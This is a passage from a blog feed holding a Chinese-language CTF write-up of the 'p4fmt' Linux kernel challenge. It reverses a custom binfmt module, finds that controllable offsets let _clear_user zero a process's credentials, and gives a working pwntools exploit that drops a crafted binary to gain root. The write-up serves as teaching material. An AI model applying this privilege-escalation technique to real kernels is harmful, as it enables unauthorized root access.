class="number">2L</span>L, v20);</span><br><span class="line">            printk(<span class="string">"clear_user(addr=0x%llx, length=0x%llx)\n"</span>, *v16, v16[<span class="number">1</span>], v22, v23);</span><br><span class="line">            _clear_user(*v16, v16[<span class="number">1</span>]); </span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">else</span></span><br><span class="line">          &#123;</span><br><span class="line">            vm_mmap(*(_QWORD *)(v4 + <span class="number">8</span>), v19, v21, (<span class="keyword">unsigned</span> __int8)v18, <span class="number">2L</span>L, v20);</span><br><span class="line">          &#125;</span><br><span class="line">          ++v10;</span><br><span class="line">          v16 += <span class="number">3</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">while</span> ( *(_DWORD *)(v4 + <span class="number">76</span>) &gt; v10 );  <span class="comment">// do while v10初始值为0 所以 0x4c应该就是一个数量，然后vm_mmap 空间</span></span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>                                                            <span class="comment">// 0x4b = 0</span></span><br><span class="line">    &#123; </span><br><span class="line">      v13 = <span class="number">-12L</span>L;</span><br><span class="line">      <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int64)vm_mmap(</span><br><span class="line">                               *(_QWORD *)(v4 + <span class="number">8</span>),</span><br><span class="line">                               *(_QWORD *)(v4 + <span class="number">80</span>),</span><br><span class="line">                               <span class="number">4096L</span>L,</span><br><span class="line">                               *(_QWORD *)(v4 + <span class="number">80</span>) &amp; <span class="number">7L</span>L,</span><br><span class="line">                               <span class="number">2L</span>L,</span><br><span class="line">                               <span class="number">0L</span>L) &gt; <span class="number">0xFFFFFFFFFFFFF000</span>LL )</span><br><span class="line">      &#123;</span><br><span class="line">LABEL_12:</span><br><span class="line">        install_exec_creds(v4); <span class="comment">//为新进程安装用户凭证</span></span><br><span class="line">        set_binfmt(&amp;p4format); <span class="comment">//应该就是注册一个格式在这个新的进程内</span></span><br><span class="line">        v14 = <span class="number">0x7FFFFFFFF000</span>LL;</span><br><span class="line">        v15 = __readgsqword((<span class="keyword">unsigned</span> __int64)&amp;current_task);</span><br><span class="line">        <span class="keyword">if</span> ( *(_QWORD *)v15 &amp; <span class="number">0x20000000</span> )</span><br><span class="line">        &#123;</span><br><span class="line">          v14 = <span class="number">3221225472L</span>L;</span><br><span class="line">          <span class="keyword">if</span> ( !(*(_BYTE *)(v15 + <span class="number">131</span>) &amp; <span class="number">8</span>) )</span><br><span class="line">            v14 = <span class="number">4294959104L</span>L;</span><br><span class="line">        &#125;</span><br><span class="line">        v10 = setup_arg_pages(v4, v14, <span class="number">0L</span>L);</span><br><span class="line">        <span class="keyword">if</span> ( !v10 )</span><br><span class="line">        &#123;</span><br><span class="line">          finalize_exec(v4);</span><br><span class="line">          start_thread( </span><br><span class="line">            v9 + <span class="number">16216</span>,</span><br><span class="line">            v13,</span><br><span class="line">            *(_QWORD *)(*(_QWORD *)(__readgsqword((<span class="keyword">unsigned</span> __int64)&amp;current_task) + <span class="number">256</span>) + <span class="number">40L</span>L));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> v10;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    v13 = *(_QWORD *)(v4 + <span class="number">0x58</span>); <span class="comment">// entry</span></span><br><span class="line">    <span class="keyword">goto</span> LABEL_12;</span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure><p>setup_new_exec</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">setup_new_exec()来初始化它的状态，它会检查新程序是否可以生成core dump文件或者是否能通过ptrace attach到新进程，对于标记了setuid和setgid的程序默认是不会生成core dump文件，如果当前用户凭证没有权限读取可执行文件时也不会生成core dump文件</span><br></pre></td></tr></table></figure><p>start_thread</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">void start_thread(struct pt_regs *regs, unsigned long new_ip, unsigned long new_sp)</span><br></pre></td></tr></table></figure><p>所以 v13应该是entry<br>所以这个文件的格式就很明确了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">P4\x00 version type count offset entry struct(chunk)</span><br></pre></td></tr></table></figure><p>程序的流程大概清晰。<br>然后在发现<code>install_exec_creds</code> 这个函数会调用 comimit_cred</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">install_exec_creds</span><span class="params">(struct linux_binprm *bprm)</span> <span class="comment">//bprm 可以控制</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">security_bprm_committing_creds(bprm);</span><br><span class="line"></span><br><span class="line">commit_creds(bprm-&gt;cred);</span><br><span class="line">bprm-&gt;cred = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Disable monitoring for regular users</span></span><br><span class="line"><span class="comment"> * when executing setuid binaries. Must</span></span><br><span class="line"><span class="comment"> * wait until new credentials are committed</span></span><br><span class="line"><span class="comment"> * by commit_creds() above</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (get_dumpable(current-&gt;mm) != SUID_DUMP_USER)</span><br><span class="line">perf_event_exit_task(current);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * cred_guard_mutex must be held at least to this point to prevent</span></span><br><span class="line"><span class="comment"> * ptrace_attach() from altering our determination of the task's</span></span><br><span class="line"><span class="comment"> * credentials; any time after this it may be unlocked.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">security_bprm_committed_creds(bprm);</span><br><span class="line">mutex_unlock(&amp;current-&gt;signal-&gt;cred_guard_mutex);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果我们能控制bprm-cred，然后清零。<br>就能成功提取了<br>想到 前面的offset可以控制，那是不是说明 load_addr 可以控制？<br>clear_user — Zero a block of memory in user space.<br><code>_clear_user(*v16, v16[1]);</code> v16很明显可以控制，那就是说通过offset指到 cred那，然后清零就能成功提权了</p><p>接下来就开始Debug</p><h3 id="Debug"><a href="#Debug" class="headerlink" title="Debug"></a>Debug</h3><p>先提取出 <code>vmlinux</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">z2x initramfs.cpio.gz</span><br></pre></td></tr></table></figure><p>再修改run.sh 使得gdb 可以连上去<br>现在先测试下刚刚得出来的 文件格式</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">       │ File: exp.py</span><br><span class="line">───────┼─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">   <span class="number">1</span>   │ <span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">   <span class="number">2</span>   │ </span><br><span class="line">   <span class="number">3</span>   │ payload  = <span class="string">"P4\x00"</span></span><br><span class="line">   <span class="number">4</span>   │ payload += <span class="string">"\x01"</span></span><br><span class="line">   <span class="number">5</span>   │ payload += p32(<span class="number">1</span>)</span><br><span class="line">   <span class="number">6</span>   │ payload += p64(<span class="number">0x90</span>)</span><br><span class="line">   <span class="number">7</span>   │ payload += p64(<span class="number">0</span>)</span><br><span class="line">   <span class="number">8</span>   │ payload += <span class="string">"Ordin"</span></span><br><span class="line">   <span class="number">9</span>   │ <span class="keyword">print</span> payload.encode(<span class="string">'base64'</span>)</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">[  160.994444] vm_mmap(load_addr=0x0, length=0xffff8880071fe3c0, offset=0x0, prot=0)</span><br><span class="line">[  161.008003] Ordin[531]: segfault at 0 ip 0000000000000000 sp 00007fffffffefaa error 14</span><br><span class="line">[  161.015835] Code: Bad RIP value.</span><br></pre></td></tr></table></figure><p>发现是成功的<br>然后再去寻找cred的偏移</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">/ # cat /proc/modules </span><br><span class="line">p4fmt 16384 0 - Live 0xffffffffc0000000 (O)</span><br><span class="line"></span><br><span class="line">pwndbg&gt; add-symbol-file ./p4fmt.ko 0xffffffffc0000000</span><br><span class="line"></span><br><span class="line">pwndbg&gt;  b *0xffffffffc00000af</span><br><span class="line"></span><br><span class="line"> ► 0xffffffff81189ec0    push   rbx</span><br><span class="line">   0xffffffff81189ec1    mov    rbx, rdi</span><br><span class="line">   0xffffffff81189ec4    call   0xffffffff81297aa0</span><br><span class="line"> </span><br><span class="line">   0xffffffff81189ec9    mov    rdi, qword ptr [rbx + 0xe0]</span><br><span class="line">   0xffffffff81189ed0    call   0xffffffff81073d30</span><br><span class="line"></span><br><span class="line">两个call  再对比下源码</span><br><span class="line">可以知道是第二个call</span><br><span class="line">void install_exec_creds(struct linux_binprm *bprm)</span><br><span class="line">&#123;</span><br><span class="line">security_bprm_committing_creds(bprm);</span><br><span class="line"></span><br><span class="line">commit_creds(bprm-&gt;cred);</span><br><span class="line">rdi 是传入的参数 可以知道 cred的偏移是0xe0</span><br><span class="line">然后因为传进去的是 v4</span><br><span class="line"></span><br><span class="line">所以 cred的距离文件头P4的偏移是 0xe0-0x48 = 0x98</span><br></pre></td></tr></table></figure><p>在调试的过程中，我发现其实成功提权的机率不算特别高。看运气的啦<br>exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">context(os=<span class="string">'linux'</span>,arch = <span class="string">'amd64'</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span><span class="params">(addr)</span>:</span></span><br><span class="line">    </span><br><span class="line">    payload  = <span class="string">"P4"</span></span><br><span class="line">    payload +=p8(<span class="number">0</span>)</span><br><span class="line">    payload += <span class="string">"\x01"</span></span><br><span class="line">    payload += p32(<span class="number">2</span>)</span><br><span class="line">    payload += p64(<span class="number">0x18</span>)</span><br><span class="line">    payload += p64(<span class="number">0x400048</span>)</span><br><span class="line">    payload += p64(<span class="number">0x400000</span>|<span class="number">7</span>)</span><br><span class="line">    payload += p64(<span class="number">0x1000</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>)</span><br><span class="line">    payload += p64((addr|<span class="number">8</span>)+<span class="number">0x10</span>)</span><br><span class="line">    payload += p64(<span class="number">0x48</span>)</span><br><span class="line">    payload += p64(<span class="number">0</span>)</span><br><span class="line">    <span class="comment">#payload += asm(shellcraft.cat('/flag')+shellcraft.exit())</span></span><br><span class="line">    <span class="keyword">return</span> payload.encode(<span class="string">'base64'</span>)</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">'./run.sh'</span>)</span><br><span class="line"><span class="comment">#UDQAAQEAAACQAAAAAAAAAAAAAAAAAAAAT3JkaW4=</span></span><br><span class="line">p.sendlineafter(<span class="string">"/ $"</span>,<span class="string">"echo -n 'UDQAAQEAAACQAAAAAAAAAAAAAAAAAAAAT3JkaW4=' | base64 -d &gt; ./tmp/Ordin"</span>)</span><br><span class="line">p.sendlineafter(<span class="string">"/ $"</span>,<span class="string">"chmod +x ./tmp/Ordin &amp;&amp; ./tmp/Ordin"</span>)</span><br><span class="line">p.recvuntil(<span class="string">'length='</span>)</span><br><span class="line">addr = int(p.recvuntil(<span class="string">","</span>)[:<span class="number">-1</span>],<span class="number">16</span>)</span><br><span class="line"><span class="keyword">print</span> hex(addr)</span><br><span class="line">payload = pwn(addr)</span><br><span class="line">cmd = <span class="string">"echo -n '%s' | base64 -d &gt; /tmp/Ordin1 ;chmod +x /tmp/Ordin1"</span> % payload</span><br><span class="line">p.sendlineafter(<span class="string">"/ $"</span>,cmd)</span><br><span class="line">p.recvuntil(<span class="string">"$ "</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">20</span>):</span><br><span class="line">    <span class="comment">#raw_input()</span></span><br><span class="line">    p.sendline(<span class="string">'/tmp/Ordin1'</span>)</span><br><span class="line">    mm = p.recvuntil(<span class="string">'/ '</span>,timeout=<span class="number">0.5</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">"FLAG"</span> <span class="keyword">in</span> mm <span class="keyword">or</span> <span class="string">"flag"</span> <span class="keyword">in</span> mm :</span><br><span class="line">        log.info(<span class="string">"success"</span>)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">    ans = p.recvuntil(<span class="string">"&gt;"</span>,timeout=<span class="number">0.5</span>)</span><br><span class="line">    log.info(ans)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><p>参考链接</p><p><a href="https://xz.aliyun.com/t/4574" target="_blank" rel="noopener">Kirin </a><br><a href="https://github.com/OAlienO/OAlienO/blob/705fd61f73703eba65732abcf87cfdbf2644108a/docs/security/pwn/writeups/p4fmt.md" target="_blank" rel="noopener">OAlienO</a></p>]]></content>
    
    <summary type="html">
    
      &lt;center&gt;&lt;font size=&quot;5&quot;&gt;info&lt;/font&gt;&lt;/center&gt;
    
    </summary>
    
    
      <category term="pwn" scheme="https://leave-Devour.github.io/categories/pwn/"/>
    
    
      <category term="linux kernel pwn" scheme="https://leave-Devour.github.io/tags/linux-kernel-pwn/"/>
    
  </entry>
  
</feed>
